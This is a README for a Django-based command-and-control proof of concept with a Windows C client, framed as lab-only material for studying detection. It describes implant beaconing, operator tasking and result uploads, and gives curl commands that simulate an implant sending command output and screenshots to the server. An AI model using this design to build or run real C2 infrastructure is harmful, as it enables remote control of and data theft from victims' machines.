# django-c2-poc

**Educational / Lab-only C2 proof-of-concept.**  
This repository contains a minimal Django-based Command-and-Control (C2) server and a complementary native Windows PoC client (C) used for lab testing and detection exercises.

> ⚠️ **IMPORTANT — Safety & Ethics**  
> This project is for **educational and defensive** use only. Do **not** run this code against systems you do not own or have explicit written permission to test. The native PoC (`poc/`) is dual-use and can be abused — treat it responsibly. See the section **“Native PoC (sensitivity & access)”** below.

---

## Repo layout

.
├─ c2/ # Django application
│ ├─ admin.py
│ ├─ apps.py
│ ├─ init.py
│ ├─ migrations/
│ ├─ models.py
│ ├─ tests.py
│ ├─ urls.py
│ └─ views.py
└─ poc/ # Native PoC (Windows C)
├─ main.c
└─ capture.c


---

## What this repo demonstrates

- A tiny Django C2 server that:
  - registers implants via `GET /c2/beacon/?id=<id>`
  - allows operator tasking via Django Admin (`Task` objects)
  - receives results via `POST /c2/upload/` (base64 text or multipart screenshot)
- A complementary native Windows PoC (in `poc/`) that demonstrates the client side flow in a lab: beacon, parse simple plaintext commands, run commands, capture screenshots, upload results.

This is intentionally minimal - the goal is to illustrate the C2 lifecycle and defensive detection signals, not to produce a production tool.

---

## Quick start — run the Django server locally (lab only)

1. Create a virtualenv and install dependencies (Python 3.10+ recommended):

```bash
python -m venv .venv
source .venv/bin/activate    # macOS / Linux
# .venv\Scripts\activate     # Windows PowerShell

pip install Django
```

2. Make sure your c2/ app is in a Django project or create a minimal project and include it. Example quick-start project:
```bash
django-admin startproject dc2proj
cd dc2proj
# Move the `c2/` folder into the project root, then:
# add "c2" to INSTALLED_APPS in dc2proj/settings.py
python manage.py migrate
python manage.py createsuperuser   # create admin user for operator UI
python manage.py runserver 127.0.0.1:8000
```

3. Open Django admin at: http://127.0.0.1:8000/admin/

---
## Endpoints & behavior (summary)

- GET /c2/beacon/?id=<implant_id>
    - Implant checks in. Server creates/updates Implant and returns the next pending Task.command (plaintext) or "none".
- POST /c2/upload/
    - Implant posts results either as:
        - form field result (base64 text)
        - file field screenshot (multipart file)
    - Server marks the task completed and saves results.

---
### Quick test with curl

Simulate beacon:
```
curl "http://127.0.0.1:8000/c2/beacon/?id=implant001"
# returns plaintext command or "none"
```
Simulate upload (text result):
```
RESULT=$(echo -n "hello implant" | base64)
curl -X POST -d "id=implant001" -d "result=${RESULT}" http://127.0.0.1:8000/c2/upload/
```
Simulate upload (file):
```
curl -X POST -F "id=implant001" -F "screenshot=@/path/to/test.bmp" http://127.0.0.1:8000/c2/upload/
```

---
## Limitations
- Plain HTTP and plaintext commands - no encryption / signing (lab-only).
- Very simple queue: server returns only the first incomplete task for an implant.
- No rate-limiting, no per-implant tokens, no quotas for uploads.
- Minimal validation and error handling.
- Django admin is an operator convenience - not a production operator console for scale.



